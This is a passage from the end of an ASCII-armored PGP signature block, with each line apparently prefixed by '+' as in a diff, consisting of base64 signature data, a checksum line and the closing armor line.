+gUpZHBj+Ct91X+90U/kV2laT/nBqhKt56+X0sYDTxoVZDK39AVELo2m9Qx9MClel
+XkjMuEzKdQhIgWTnKbtZWD9Hia9B/REI0b4IlPZvjO+frtWJsUiKzIES/DX1Us47
+PtjlNBSKx4UOgJsnyRcvcDVt4+FYL4dP3486Lt9lSA30VbVRGFfl7dUtqY4Xx85P
+LveGruDC8qWrRLgIQScpY3i1yxUvia9/i2kwdGaAx0O/pW+Jh6d99r0KoyqUrALj
+xhVidhq2xr1wc7+zOtMkQUkw0Z4vgO0p/beD7NPbHii6I7HvB/eu/2y6mIuDoelT
+NMAaflKJQX1ryvUqMSWjSw+kp45C4pA3Sf8vQLJdYU7YfVRto6w=
+=+bRH
+-----END PGP SIGNATURE-----
